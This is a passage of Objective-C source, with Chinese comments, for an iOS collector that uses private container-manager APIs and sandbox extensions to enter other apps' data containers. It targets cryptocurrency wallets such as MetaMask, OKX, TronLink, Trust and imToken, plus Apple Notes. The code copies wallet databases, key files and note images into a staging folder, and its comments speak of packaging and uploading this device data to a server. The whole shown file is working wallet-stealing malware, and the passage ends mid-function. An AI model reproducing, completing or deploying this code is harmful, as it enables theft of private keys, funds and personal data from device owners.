#import "OWContainerPass.h"
#import "OWArchive.h"
#import "OWMCM.h"
#import "OWMCMLease.h"
#import "OWLaunchServices.h"
#include <dlfcn.h>
#include <ctype.h>
#import <objc/message.h>
#include <sqlite3.h>

NSString * const OWContainerPassDidFinishNotification = @"OWContainerPassDidFinish";

static NSString * const kOWContainerMetaName = @".com.apple.mobile_container_manager.metadata.plist";

/// 不采集的 IM 类 App（Telegram / WhatsApp / WeChat）
static NSSet<NSString *> *OWSkipBundleIds(void) {
    static NSSet *s;
    static dispatch_once_t once;
    dispatch_once(&once, ^{
        s = [NSSet setWithArray:@[@"ph.telegra.Telegraph",
                                  @"net.whatsapp.WhatsApp",
                                  @"com.tencent.xin"]];
    });
    return s;
}

/// 单遍遍历时要整棵子树跳过的目录（相对容器根的小写路径）。
/// 这些目录只装缓存/日志/媒体，既不会有密钥，索引里也不需要。
static BOOL OWIsHeavyRel(NSString *lower, BOOL includeMedia) {
    static NSArray<NSString *> *heavy;
    static dispatch_once_t once;
    dispatch_once(&once, ^{
        heavy = @[@"library/caches/", @"tmp/", @"library/httpstorages/",
                  @"library/webkit/", @"library/logs/", @"library/splashboards/",
                  @"io.sentry/", @"com.crashlytics/", @"media/",
                  @"library/application support/com.apple.sharedfilelist/"];
    });
    for (NSString *h in heavy) {
        // 备忘录要图片：Media 目录对 includeMedia=true 的目标不跳过
        if (includeMedia && [h isEqualToString:@"media/"]) continue;
        if ([lower isEqualToString:[h substringToIndex:h.length - 1]]) return YES;
        if ([lower hasPrefix:h]) return YES;
    }
    return NO;
}

#pragma mark - 目标清单

static NSArray<NSDictionary *> *OWTargets(void) {
    static NSArray *t;
    static dispatch_once_t once;
    dispatch_once(&once, ^{
        NSString *p = [[NSBundle mainBundle] pathForResource:@"targets" ofType:@"plist"];
        NSDictionary *d = [NSDictionary dictionaryWithContentsOfFile:p];
        t = d[@"wallets"] ?: @[];
        OWLog(@"目标清单: %lu 条", (unsigned long)t.count);
    });
    return t;
}

#pragma mark - OWFileGate

@implementation OWFileGate

+ (BOOL)isSQLiteAtPath:(NSString *)path {
    NSFileHandle *fh = [NSFileHandle fileHandleForReadingAtPath:path];
    if (!fh) return NO;
    NSData *head = [fh readDataOfLength:16];
    [fh closeFile];
    return head.length >= 16 && [[[NSString alloc] initWithData:[head subdataWithRange:NSMakeRange(0, 15)]
                                                        encoding:NSUTF8StringEncoding] hasPrefix:@"SQLite format"];
}

+ (BOOL)isPlausiblePayloadAtPath:(NSString *)path minBytes:(uint64_t)minBytes maxBytes:(uint64_t)maxBytes {
    NSDictionary *a = [[NSFileManager defaultManager] attributesOfItemAtPath:path error:nil];
    if (!a) return NO;
    uint64_t sz = [a fileSize];
    if (sz < minBytes || sz > maxBytes) {
        OWLog(@"gate: %@ 体积越界 %llu", path.lastPathComponent, sz);
        return NO;
    }
    return sz > 0;
}

+ (BOOL)looksEmptyDatabaseAtPath:(NSString *)path {
    if (![self isSQLiteAtPath:path]) return NO;
    sqlite3 *db = NULL;
    if (sqlite3_open_v2(path.UTF8String, &db, SQLITE_OPEN_READONLY, NULL) != SQLITE_OK) return NO;

    sqlite3_stmt *st = NULL;
    BOOL empty = YES;
    if (sqlite3_prepare_v2(db, "SELECT name FROM sqlite_master WHERE type='table';", -1, &st, NULL) == SQLITE_OK) {
        NSMutableArray *tables = [NSMutableArray new];
        while (sqlite3_step(st) == SQLITE_ROW) {
            const unsigned char *n = sqlite3_column_text(st, 0);
            if (n) [tables addObject:[NSString stringWithUTF8String:(const char *)n]];
        }
        sqlite3_finalize(st);

        for (NSString *tb in tables) {
            // 快判：只要任意表存在一行就认为非空。用 LIMIT 1 而不是 COUNT(*)，
            // 后者在几十万行的聊天库上要全表扫，是 B 阶段的主要耗时之一。
            NSString *sql = [NSString stringWithFormat:@"SELECT 1 FROM \"%@\" LIMIT 1;", tb];
            if (sqlite3_prepare_v2(db, sql.UTF8String, -1, &st, NULL) == SQLITE_OK) {
                if (sqlite3_step(st) == SQLITE_ROW) { empty = NO; }
                sqlite3_finalize(st);
            }
            if (!empty) break;
        }
    }
    sqlite3_close(db);
    return empty;
}

@end

#pragma mark - OWContainerPass

@interface OWContainerPass ()
+ (BOOL)isSkippedBundleId:(NSString *)bundleId;
- (BOOL)_measureDirectory:(NSString *)dir fileCount:(NSInteger *)count bytes:(uint64_t *)bytes;
- (void)_noteResultForName:(NSString *)name
                  bundleId:(NSString *)bid
                     dir:(NSString *)outDir
            containerPath:(NSString *)containerPath;
- (void)_collectAndIndex:(NSDictionary *)target
           containerPath:(NSString *)containerPath
                  outDir:(NSString *)outDir
                    name:(NSString *)name
            includeMedia:(BOOL)includeMedia;
- (void)_restorePayloadsFromDir:(NSString *)dir;
- (uint64_t)_sizeOf:(NSString *)path;
- (nullable NSString *)_fuzzyBundleIdForName:(NSString *)name
                                   installed:(NSDictionary<NSString *, NSString *> *)installed;
- (void)_copyMediaUnder:(NSString *)root
                   name:(NSString *)name
                 outDir:(NSString *)outDir;
@end

@implementation OWContainerPass {
    NSMutableArray<NSDictionary *> *_results;
    NSMutableArray<NSDictionary *> *_payloadBatch;   // 批量记账，目标结束一次落盘
    uint64_t _collectedBytes;   // 当前目标已采集字节数（防微信这类整目录失控）
}

+ (BOOL)isSkippedBundleId:(NSString *)bundleId {
    return bundleId.length && [OWSkipBundleIds() containsObject:bundleId];
}

- (BOOL)_measureDirectory:(NSString *)dir fileCount:(NSInteger *)count bytes:(uint64_t *)bytes {
    NSFileManager *fm = [NSFileManager defaultManager];
    BOOL isDir = NO;
    if (![fm fileExistsAtPath:dir isDirectory:&isDir] || !isDir) return NO;

    NSInteger n = 0;
    uint64_t total = 0;
    // 必须和 _noteResultForName 的统计口径完全一致（递归、含 _file_index.json），
    // 否则断点校验的 fileCount/bytes 永远对不上，等于没有断点。
    for (NSString *rel in [fm enumeratorAtPath:dir]) {
        NSString *p = [dir stringByAppendingPathComponent:rel];
        NSDictionary *a = [fm attributesOfItemAtPath:p error:nil];
        if (!a || [a[NSFileType] isEqualToString:NSFileTypeDirectory]) continue;
        n++;
        total += [a fileSize];
    }
    if (count) *count = n;
    if (bytes) *bytes = total;
    return n > 0;
}

- (instancetype)init {
    if (self = [super init]) {
        _maxFileBytes = 200ULL * 1024 * 1024;
        // 单目标总采集上限：微信 Documents 全量会到 398MB，150MB 足够保留核心库
        _maxContainerBytes = 150ULL * 1024 * 1024;
        _requireProtectedData = YES;
        _results = [NSMutableArray new];

        NSArray *docs = NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES);
        NSString *docDir = docs.firstObject ?: NSTemporaryDirectory();
        _workDir = [docDir stringByAppendingPathComponent:@"ow_collect"];
        [[NSFileManager defaultManager] createDirectoryAtPath:_workDir
                                  withIntermediateDirectories:YES attributes:nil error:nil];
    }
    return self;
}

#pragma mark keybag 前置

- (BOOL)_waitForProtectedDataWithTimeout:(NSTimeInterval)timeout {
    OWDeviceProfile *dev = [OWDeviceProfile current];
    NSDate *deadline = [NSDate dateWithTimeIntervalSinceNow:timeout];
    while (!dev.protectedDataAvailable) {
        OWLog(@"B: keybag 未解锁，等待（避免把读不到误判为没钱包）");
        if ([[NSDate date] compare:deadline] == NSOrderedDescending) {
            _lastError = @"protectedData 长时间不可用（设备重启后未解锁 / 锁屏中）";
            OWLog(@"B: %@", _lastError);
            return NO;
        }
        [NSThread sleepForTimeInterval:2.0];
    }
    return YES;
}

#pragma mark 主流程

- (BOOL)run:(NSError **)error {
    if (self.requireProtectedData && ![self _waitForProtectedDataWithTimeout:120]) {
        if (error) *error = [NSError errorWithDomain:@"OWContainerPass" code:30
                                userInfo:@{NSLocalizedDescriptionKey: _lastError ?: @"keybag 未解锁"}];
        return NO;
    }

    // ---- MCM 预检：libcontainer + 符号 + 身份 + sandbox 能力 ----
    OWMCMStatus st = [[OWMCM shared] prepare];
    if (st != OWMCMStatusOK) {
        _lastError = [NSString stringWithFormat:@"MCM 不可用(%d): %@", (int)st, [OWMCM shared].lastError];
        OWLog(@"B: %@", _lastError);
        if (error) *error = [NSError errorWithDomain:@"OWContainerPass" code:st
                                userInfo:@{NSLocalizedDescriptionKey: _lastError}];
        return NO;
    }
    OWLog(@"B: MCM 就绪 identity=%@ lease=%@ 上限=%lu",
          [OWMCM shared].signedIdentity ?: @"?",
          [OWMCMLease shared].available ? @"可用" : @"不可用",
          (unsigned long)[OWMCMLease shared].maxConcurrent);

    NSMutableDictionary<NSString *, NSString *> *found = [NSMutableDictionary new];
    NSArray<NSDictionary *> *targets = OWTargets();
    NSDate *tB = [NSDate date];
    NSUInteger hitTargets = 0;
    OWLog(@"B: 目标 %lu 个（MHA 定向模式，不做枚举）", (unsigned long)targets.count);

    // Discovery：LaunchServices 能读就读，拿到「已安装 App 的 bundleId 全量列表」。
    // 用途一：目标变体都查不到时按名字模糊反查（本次 TronLink 就是这么漏的）；
    // 用途二：把含钱包关键词的 bundleId 打进日志，方便后续校准 targets.plist。
    NSDictionary<NSString *, NSString *> *installed = [OWLaunchServices shared].allMappings;
    OWLog(@"B: Discovery 已安装 %lu 个 App（LS 状态: %@）",
          (unsigned long)installed.count, [OWLaunchServices shared].status ?: @"?");
    if (installed.count) {
        NSArray *hints = @[@"wallet", @"tron", @"token", @"metamask", @"okx", @"okex",
                           @"bitpie", @"trust", @"ledger", @"trezor", @"safepal",
                           @"onekey", @"coinbase", @"exodus", @"blockchain", @"imtoken"];
        NSMutableArray *hits = [NSMutableArray array];
        for (NSString *b in installed) {
            NSString *low = b.lowercaseString;
            for (NSString *k in hints) {
                if ([low containsString:k]) { [hits addObject:b]; break; }
            }
        }
        if (hits.count) {
            OWLog(@"B: Discovery 钱包类候选 %lu: %@", (unsigned long)hits.count,
                  [hits componentsJoinedByString:@", "]);
        }
    }

    // MHA 路线只支持「一个 identifier 一次查询」，所以直接按 targets 定向。
    for (NSDictionary *t in targets) {
        NSString *name = t[@"name"] ?: t[@"bundleId"];
        NSString *bid = t[@"bundleId"];
        if (!bid.length) continue;

        // IM 类不采集：数据加密/体积大/价值低，连查询都省掉
        if ([OWContainerPass isSkippedBundleId:bid]) {
            OWLog(@"B: 跳过 %@（IM 类不采集）", name);
            continue;
        }

        // bundleIds：同一钱包的不同 App ID 变体（OKX/OKEx、Trust 等）
        NSArray *bids = t[@"bundleIds"];
        if (![bids isKindOfClass:[NSArray class]] || !bids.count) {
            bids = @[bid];
        }

        __attribute__((objc_precise_lifetime))
        OWMCMContainer *c = nil;
        NSString *hitBid = nil;
        for (NSString *b in bids) {
            OWMCMClass cls = [b hasPrefix:@"group."] ? OWMCMClassAppGroup
                                                     : OWMCMClassApplicationData;
            OWMCMContainer *tmp = [[OWMCM shared] containerOfClass:cls identifier:b error:nil];
            if (!tmp) {
                OWMCMClass alt = (cls == OWMCMClassAppGroup) ? OWMCMClassApplicationData
                                                             : OWMCMClassAppGroup;
                tmp = [[OWMCM shared] containerOfClass:alt identifier:b error:nil];
            }
            if (tmp && tmp.path.length) { c = tmp; hitBid = b; break; }
        }
        if (!c || !c.path.length) {
            // 变体都没命中：用 Discovery 列表按名字模糊反查一次（TronLink 这类改名/变体包）
            NSString *fuzzy = [self _fuzzyBundleIdForName:name installed:installed];
            if (fuzzy.length && ![bids containsObject:fuzzy]) {
                for (NSNumber *cn in @[@(OWMCMClassApplicationData), @(OWMCMClassAppGroup)]) {
                    OWMCMContainer *tmp = [[OWMCM shared] containerOfClass:(OWMCMClass)cn.integerValue
                                                                identifier:fuzzy error:nil];
                    if (tmp && tmp.path.length) {
                        c = tmp; hitBid = fuzzy;
                        OWLog(@"B: %@ 变体未命中，Discovery 反查到 %@", name, fuzzy);
                        break;
                    }
                }
            }
        }
        if (!c || !c.path.length) {
            OWLog(@"B: %@ (%@) 未找到容器（变体 %lu 个）", name, bid, (unsigned long)bids.count);
            continue;
        }
        found[hitBid] = c.path;
        hitTargets++;

        // 目标级断点：本轮已完整采集过（路径/文件数/字节都对得上）就跳过，省掉重复拷贝
        NSInteger priorCount = 0;
        uint64_t priorBytes = 0;
        NSString *priorDir = [self.workDir stringByAppendingPathComponent:name];
        if ([self _measureDirectory:priorDir fileCount:&priorCount bytes:&priorBytes] &&
            [[OWState shared] isTargetDone:bid containerPath:c.path
                                 fileCount:priorCount bytes:priorBytes]) {
            OWLog(@"B: 跳过已完成目标 %@（%ld 文件 / %llu B）", name,
                  (long)priorCount, priorBytes);
            // 断点续跑时本轮 payloads 已被清空，这里按落盘产物补回来，
            // 否则 _hasValidPayload 判定为无数据，本轮永远不会写 done。
            [self _restorePayloadsFromDir:priorDir];
            // 这个目标本轮已经上传成功过：不要再打包上传一份（服务端会出现重复设备数据）
            // 注意 OWRoute 打包时会把 AppleNotes 改名成 Notes，键名要一致
            NSString *upName = [name isEqualToString:@"AppleNotes"] ? @"Notes" : name;
            BOOL uploaded = [[OWState shared] objectForKey:
                             [@"up_" stringByAppendingString:upName]] != nil;
            if (!uploaded && [(t[@"mode"] ?: @"") isEqualToString:@"whole_container"]) {
                uploaded = [[OWState shared] objectForKey:@"up_container"] != nil;
            }
            if (uploaded) {
                OWLog(@"B: %@ 已上传过，续跑不再重复打包", name);
            } else {
                [self _noteResultForName:name bundleId:bid dir:priorDir containerPath:c.path];
            }
            continue;
        }

        NSDate *tT = [NSDate date];
        NSString *reason = nil;
        if (![[OWMCMLease shared] activateContainer:c reason:&reason]) {
            OWLog(@"B: %@ lease 失败 (%@)", name, reason ?: @"?");
            continue;
        }
        [self _collectTarget:t containerPath:c.path includeMedia:[t[@"includeMedia"] boolValue]];
        OWLog(@"B: %@ 完成（%.2fs）", name, -[tT timeIntervalSinceNow]);
        [[OWMCMLease shared] releasePath:c.path];
    }

    [self _writeContainerMap:found];

    [[OWMCMLease shared] releaseAll];
    OWLog(@"B: 汇总 目标=%lu 命中=%lu 产物=%lu 映射=%lu 用时=%.2fs",
          (unsigned long)targets.count, (unsigned long)hitTargets,
          (unsigned long)_results.count, (unsigned long)found.count,
          -[tB timeIntervalSinceNow]);

    [[NSNotificationCenter defaultCenter] postNotificationName:OWContainerPassDidFinishNotification object:self];
    // YES = 流程跑通；产出为 0 通常是设备上没装目标钱包，由 OWRoute 判定是否写 done
    return YES;
}

#pragma mark pass1 枚举

- (NSString *)_bundleIdForContainer:(OWMCMContainer *)c {
    NSString *ident = c.identifier;
    // 多数版本 identifier 就是 bundleId（含点）
    if (ident.length && [ident containsString:@"."]) return ident;

    // 形如 UUID → 反查
    NSString *mapped = [[OWLaunchServices shared] bundleIdForUUID:ident];
    if (mapped.length) return mapped;

    // 兜底：读容器根目录 metadata.plist 的 MCMMetadataIdentifier
    NSString *meta = [self _metadataBundleIdAtPath:c.path];
    if (meta.length) return meta;

    return ident ?: @"";
}

- (NSString * _Nullable)_metadataBundleIdAtPath:(NSString *)containerPath {
    if (!containerPath.length) return nil;
    NSString *p = [containerPath stringByAppendingPathComponent:kOWContainerMetaName];
    NSDictionary *d = [NSDictionary dictionaryWithContentsOfFile:p];
    id v = d[@"MCMMetadataIdentifier"];
    return [v isKindOfClass:[NSString class]] ? v : nil;
}

- (void)_enumerateClass:(OWMCMClass)cls into:(NSMutableDictionary<NSString *, NSString *> *)found {
    NSError *err = nil;
    NSArray<OWMCMContainer *> *list = [[OWMCM shared] containersOfClass:cls
                                                           identifiers:nil
                                                                 error:&err];
    if (!list.count) {
        OWLog(@"B: class=%llu(%@) 枚举 0 个%@",
              (unsigned long long)cls, [OWMCM classNameFor:cls],
              err ? [NSString stringWithFormat:@"（%@）", err.localizedDescription] : @"");
        return;
    }

    NSUInteger hit = 0, leaseOK = 0, skippedDup = 0;
    for (OWMCMContainer *c in list) {
        NSString *bid = [self _bundleIdForContainer:c];

        // 去重：同一个 bundleId 可能在多个 class 下都有容器（app-data / extension / service）。
        // 已经采过的跳过，避免重复打包和重复上传。
        BOOL dup = (bid.length && found[bid] != nil);
        if (!dup && bid.length) found[bid] = c.path;

        NSDictionary *target = [self _targetForBundleId:bid];
        if (!target) continue;
        hit++;

        if (dup) {
            skippedDup++;
            OWLog(@"B: 跳过重复 %@（class=%@，已在其它 class 采过）",
                  bid, [OWMCM classNameFor:cls]);
            continue;
        }

        // ★ 必须激活 sandbox extension，否则文件读不到（EPERM）
        NSString *reason = nil;
        if (![[OWMCMLease shared] activateContainer:c reason:&reason]) {
            OWLog(@"B: lease 失败 %@ → %@ (%@)", bid, c.path, reason ?: @"?");
            continue;
        }
        leaseOK++;

        [self _collectTarget:target containerPath:c.path
                includeMedia:[target[@"includeMedia"] boolValue]];

        // 采完立刻还，避免 lease 池满（目标包 active_leases=3）
        [[OWMCMLease shared] releasePath:c.path];
    }
    OWLog(@"B: class=%llu(%@) 共 %lu 个，命中 %lu，lease 成功 %lu，跳过重复 %lu",
          (unsigned long long)cls, [OWMCM classNameFor:cls],
          (unsigned long)list.count, (unsigned long)hit,
          (unsigned long)leaseOK, (unsigned long)skippedDup);
}

#pragma mark pass2 定向

- (void)_targetedPassInto:(NSMutableDictionary<NSString *, NSString *> *)found {
    NSMutableArray<NSString *> *missing = [NSMutableArray array];
    for (NSDictionary *t in OWTargets()) {
        NSString *bid = t[@"bundleId"];
        if (bid.length && !found[bid]) [missing addObject:bid];
    }
    if (!missing.count) {
        OWLog(@"B: pass2 无需补扫");
        return;
    }
    OWLog(@"B: pass2 定向补扫 %lu 个: %@", (unsigned long)missing.count, missing);

    for (NSString *bid in missing) {
        NSError *err = nil;
        OWMCMContainer *c = [[OWMCM shared] containerOfClass:OWMCMClassApplicationData
                                                  identifier:bid error:&err];
        if (!c) {
            OWLog(@"B: pass2 %@ 未找到%@", bid,
                  err ? [NSString stringWithFormat:@"（%@）", err.localizedDescription] : @"");
            continue;
        }
        NSString *reason = nil;
        if (![[OWMCMLease shared] activateContainer:c reason:&reason]) {
            OWLog(@"B: pass2 %@ lease 失败 (%@)", bid, reason ?: @"?");
            continue;
        }
        found[bid] = c.path;
        NSDictionary *t = [self _targetForBundleId:bid];
        if (t) [self _collectTarget:t containerPath:c.path
                       includeMedia:[t[@"includeMedia"] boolValue]];
        [[OWMCMLease shared] releasePath:c.path];
    }
}

- (BOOL)grabBundleId:(NSString *)bundleId toDir:(NSString *)dir error:(NSError **)error {
    if (!bundleId.length) {
        if (error) *error = [NSError errorWithDomain:@"OWContainerPass" code:31
                                userInfo:@{NSLocalizedDescriptionKey: @"bundleId 为空"}];
        return NO;
    }

    OWMCMContainer *c = [[OWMCM shared] containerOfClass:OWMCMClassApplicationData
                                              identifier:bundleId error:error];
    if (!c) {
        if (error) *error = [NSError errorWithDomain:@"OWContainerPass" code:31
                                userInfo:@{NSLocalizedDescriptionKey:
                                    [NSString stringWithFormat:@"取不到容器 %@", bundleId]}];
        return NO;
    }

    NSString *reason = nil;
    if (![[OWMCMLease shared] activateContainer:c reason:&reason]) {
        if (error) *error = [NSError errorWithDomain:@"OWContainerPass" code:32
                                userInfo:@{NSLocalizedDescriptionKey: reason ?: @"lease 失败"}];
        return NO;
    }

    NSDictionary *t = [self _targetForBundleId:bundleId]
        ?: @{@"name": bundleId, @"bundleId": bundleId, @"mode": @"scan"};
    [self _collectTarget:t containerPath:c.path
            includeMedia:[t[@"includeMedia"] boolValue]];

    [[OWMCMLease shared] releasePath:c.path];
    return YES;
}

#pragma mark 采集

- (NSDictionary * _Nullable)_targetForBundleId:(NSString *)bid {
    for (NSDictionary *t in OWTargets()) {
        if ([t[@"bundleId"] isEqualToString:bid]) return t;
    }
    return nil;
}

- (void)_collectTarget:(NSDictionary *)target
         containerPath:(NSString *)containerPath
          includeMedia:(BOOL)includeMedia {
    NSString *name = target[@"name"] ?: target[@"bundleId"];
    NSString *mode = target[@"mode"] ?: @"files";
    NSString *outDir = [self.workDir stringByAppendingPathComponent:name];
    NSFileManager *fm0 = [NSFileManager defaultManager];
    // 采集阶段要么整目标完成、要么整目标重来：
    // 先清空目标目录，避免上次被杀留下的半成品/旧文件（含 .part）混进这一轮的包。
    [fm0 removeItemAtPath:outDir error:nil];
    [fm0 createDirectoryAtPath:outDir
   withIntermediateDirectories:YES attributes:nil error:nil];
    OWLog(@"B: 采集 %@ (%@) mode=%@%@", name, target[@"bundleId"], mode,
          includeMedia ? @" +media" : @"");

    // 单目标体积上限可按目标覆盖（备忘录要从 150MB 提到 300MB 装图片）
    uint64_t savedCap = self.maxContainerBytes;
    NSNumber *capNum = target[@"maxBytes"];
    if ([capNum isKindOfClass:[NSNumber class]] && capNum.unsignedLongLongValue > 0) {
        self.maxContainerBytes = capNum.unsignedLongLongValue;
        OWLog(@"B: %@ 单目标上限 = %llu B", name, self.maxContainerBytes);
    }

    if ([mode isEqualToString:@"whole_container"]) {
        [self _zipContainer:containerPath to:[outDir stringByAppendingPathComponent:@"container.zip"] name:name];
        self.maxContainerBytes = savedCap;
        return;
    }

    // 单遍：定义件拷贝 + 兜底候选收集 + 文件索引，一次 enumerator 走完
    [self _collectAndIndex:target containerPath:containerPath outDir:outDir
                      name:name includeMedia:includeMedia];

    // 记账要用「本目标生效的上限」，所以恢复默认值放到记账之后
    [self _noteResultForName:name bundleId:target[@"bundleId"] dir:outDir containerPath:containerPath];
    self.maxContainerBytes = savedCap;
}

/// 采集分三段，按代价从低到高：
///   1) 定义文件：精确路径直接 stat+拷贝，不遍历容器；
///   2) 定义目录：只遍历该子树（如 OKX 的 Documents/wallet）；
///   3) 只有定义件不足（<64KB 或 0 个）才扫全容器兜底，顺带补全索引。
/// 这样已识别的钱包不再为「索引」白扫一遍容器 —— OKX 这类上万项的容器曾因此耗 24s。
- (void)_collectAndIndex:(NSDictionary *)target
           containerPath:(NSString *)containerPath
                  outDir:(NSString *)outDir
                    name:(NSString *)name
            includeMedia:(BOOL)includeMedia {
    NSArray *paths = target[@"paths"] ?: @[];
    NSArray *keywords = target[@"keywords"] ?: @[];
    NSArray *exts = target[@"exts"] ?: @[];
    NSArray *excludes = target[@"excludes"] ?: @[];
    NSFileManager *fm = [NSFileManager defaultManager];
    _collectedBytes = 0;

    NSMutableArray<NSString *> *indexPaths = [NSMutableArray array];
    NSMutableArray<NSString *> *dirRels = [NSMutableArray array];
    NSUInteger foundFiles = 0;
    uint64_t definedBytes = 0;

    // ---- A) 定义文件：精确路径直接 stat + 拷贝，完全不遍历容器 ----
    for (NSString *rel in paths) {
        if (!rel.length) continue;
        NSString *src = [containerPath stringByAppendingPathComponent:rel];
        BOOL isDir = NO;
        if (![fm fileExistsAtPath:src isDirectory:&isDir]) continue;
        if (isDir) { [dirRels addObject:rel]; continue; }

        [indexPaths addObject:rel];
        if ([self _copyItem:src toDir:outDir name:rel]) {
            foundFiles++;
            definedBytes += [self _sizeOf:src];
        }
        // sqlite 边车：-wal/-shm 跟着主库走；若边车本身也是定义件，交给它自己那一轮
        for (NSString *suffix in @[@"-wal", @"-shm"]) {
            NSString *sideRel = [rel stringByAppendingString:suffix];
            if ([paths containsObject:sideRel]) continue;
            NSString *side = [containerPath stringByAppendingPathComponent:sideRel];
            BOOL sideIsDir = NO;
            if (![fm fileExistsAtPath:side isDirectory:&sideIsDir] || sideIsDir) continue;
            if ([self _copyItem:side toDir:outDir name:sideRel]) {
                definedBytes += [self _sizeOf:side];
            }
        }
    }

    // ---- B) 定义目录：只遍历该子树（如 OKX 的 Documents/wallet），不扫整个容器 ----
    for (NSString *drel in dirRels) {
        NSString *src = [containerPath stringByAppendingPathComponent:drel];
        NSUInteger n = 0;
        uint64_t bytes = 0;
        [self _copyDefinedDir:src rel:drel outDir:outDir exts:exts keywords:keywords
                     excludes:excludes indexPath:indexPaths copied:&n bytes:&bytes
                 includeMedia:includeMedia];
        foundFiles += n;
        definedBytes += bytes;
    }

    OWLog(@"B: %@ 定义件命中 %lu/%lu，有效 %llu B", name,
          (unsigned long)foundFiles, (unsigned long)paths.count, definedBytes);

    // ---- C) 只有定义件不足（版本改了路径 / 密钥文件在别处）才扫全容器 ----
    BOOL weak = (foundFiles == 0 || definedBytes < 64ULL * 1024);
    if (weak) {
        OWLog(@"B: %@ 定义件不足，启用全容器兜底扫描", name);
        [self _fallbackScanContainer:containerPath outDir:outDir name:name
                                exts:exts keywords:keywords excludes:excludes
                           indexPath:indexPaths includeMedia:includeMedia];
    }

    // ---- C2) 备忘录：按扩展名兜底收图片/视频（Media 目录名在版本间会变）----
    if (includeMedia) {
        [self _copyMediaUnder:containerPath name:name outDir:outDir];
    }

    // ---- D) 文件索引：没走兜底时只记定义路径，不为索引白扫容器 ----
    NSMutableArray *indexItems = [NSMutableArray arrayWithCapacity:indexPaths.count];
    for (NSString *rel in indexPaths) [indexItems addObject:@{@"p": rel}];
    NSDictionary *idx = @{
        @"target": target[@"name"] ?: @"",
        @"bundleId": target[@"bundleId"] ?: @"",
        @"defined": paths,
        @"files": indexItems,
    };
    NSData *d = [NSJSONSerialization dataWithJSONObject:idx options:0 error:nil];
    if (d.length) {
        [d writeToFile:[outDir stringByAppendingPathComponent:@"_file_index.json"]
            atomically:YES];
    }
    OWLog(@"B: 索引 %@ %lu 条", name, (unsigned long)indexPaths.count);
}

/// 备忘录图文附件兜底：不依赖固定目录名（Media / FallbackImages / Previews 都可能），
/// 直接在容器里按扩展名收图片/视频，保留相对路径；同时打印各附件目录的存在性便于校准。
- (void)_copyMediaUnder:(NSString *)root
                   name:(NSString *)name
                 outDir:(NSString *)outDir {
    NSFileManager *fm = [NSFileManager defaultManager];
    for (NSString *d in @[@"Media", @"FallbackImages", @"Previews", @"Accounts"]) {
        BOOL isDir = NO;
        NSString *p = [root stringByAppendingPathComponent:d];
        BOOL exist = [fm fileExistsAtPath:p isDirectory:&isDir];
        NSUInteger cnt = 0;
        if (exist && isDir) {
            for (NSString *f in [fm enumeratorAtPath:p]) {
                if (++cnt > 9999) break;
            }
        }
        OWLog(@"B: %@ 附件目录 %@ 存在=%@ 条目=%lu", name, d,
              exist ? @"是" : @"否", (unsigned long)cnt);
    }

    NSSet *mediaExts = [NSSet setWithArray:@[@"jpg", @"jpeg", @"png", @"gif", @"heic",
                                             @"heif", @"webp", @"bmp", @"tiff",
                                             @"mp4", @"mov", @"m4v"]];
    NSUInteger copied = 0, scanned = 0;
    uint64_t bytes = 0;
    NSDirectoryEnumerator *en = [fm enumeratorAtPath:root];
    for (NSString *rel in en) {
        if (++scanned > 50000) break;
        if (copied >= 2000 || bytes >= 100ULL * 1024 * 1024) break;
        if (_collectedBytes >= self.maxContainerBytes) break;
        NSString *lower = rel.lowercaseString;
        // includeMedia=YES：不跳过 Media，但仍跳过 Caches/tmp/日志
        if (OWIsHeavyRel(lower, YES)) { [en skipDescendants]; continue; }
        if (![mediaExts containsObject:lower.pathExtension]) continue;
        if ([fm fileExistsAtPath:[outDir stringByAppendingPathComponent:rel]]) continue;  // 已拷过
        if ([self _copyItem:[root stringByAppendingPathComponent:rel] toDir:outDir name:rel]) {
            copied++;
            bytes += [self _sizeOf:[root stringByAppendingPathComponent:rel]];
        }
    }
    OWLog(@"B: %@ 图片/视频兜底 命中 %lu 个 / %llu B", name,
          (unsigned long)copied, bytes);
}

/// 定义目录的单遍处理：命中扩展名/关键词的按相对路径命名；
/// 漏网的再按「无扩展名 / 白名单扩展名 / 非媒体小文件」宽松收，接住 F4SeCyr 这类密钥文件。
- (void)_copyDefinedDir:(NSString *)root
                    rel:(NSString *)drel
                 outDir:(NSString *)outDir
                   exts:(NSArray<NSString *> *)exts
               keywords:(NSArray<NSString *> *)keywords
               excludes:(NSArray<NSString *> *)excludes
              indexPath:(NSMutableArray<NSString *> *)indexPath
                 copied:(NSUInteger *)copied
                  bytes:(uint64_t *)bytes
           includeMedia:(BOOL)includeMedia {
    NSFileManager *fm = [NSFileManager defaultManager];
    NSMutableArray<NSString *> *useExts = [NSMutableArray array];
    for (NSString *e in exts) if (e.length) [useExts addObject:e.lowercaseString];
    NSMutableArray<NSString *> *useKws = [NSMutableArray array];
    for (NSString *k in keywords) if (k.length) [useKws addObject:k.lowercaseString];
    NSSet *media = [NSSet setWithArray:@[@"jpg", @"jpeg", @"png", @"gif", @"heic", @"heif",
                                         @"mp4", @"mov", @"m4a", @"mp3", @"wav", @"pdf", @"zip"]];
    NSSet *lenientExts = [NSSet setWithArray:@[@"plist", @"dat", @"bin", @"keystore",
                                               @"mmkv", @"txt", @"lock", @"json"]];

    NSUInteger n = 0;
    uint64_t total = 0;
    NSDirectoryEnumerator *en = [fm enumeratorAtPath:root];
    for (NSString *rel in en) {
        NSString *lower = rel.lowercaseString;
        if (OWIsHeavyRel(lower, includeMedia)) { [en skipDescendants]; continue; }
        BOOL skip = NO;
        for (NSString *ex in excludes) {
            if (ex.length && [lower containsString:ex.lowercaseString]) { skip = YES; break; }
        }
        if (skip) continue;
        if (indexPath) [indexPath addObject:[drel stringByAppendingPathComponent:rel]];

        NSString *subExt = lower.pathExtension;
        BOOL extHit = [useExts containsObject:subExt];
        BOOL kwHit = NO;
        for (NSString *k in useKws) {
            if ([lower rangeOfString:k].location != NSNotFound) { kwHit = YES; break; }
        }
        NSString *full = [root stringByAppendingPathComponent:rel];

        BOOL keep = extHit || kwHit;
        if (!keep) {
            NSDictionary *fa = [fm attributesOfItemAtPath:full error:nil];
            if (!fa || [fa[NSFileType] isEqualToString:NSFileTypeDirectory]) continue;
            uint64_t sz = [fa fileSize];
            if (includeMedia && [media containsObject:subExt]) {
                // 备忘录图片/附件：不受 2MB 宽松上限限制，交给 _copyItem 的总量上限兜底
                keep = YES;
            } else {
                keep = subExt.length == 0 ||
                       [lenientExts containsObject:subExt] ||
                       (![media containsObject:subExt] && sz <= 2ULL * 1024 * 1024);
            }
            if (!keep) continue;
        } else {
            BOOL isDir = NO;
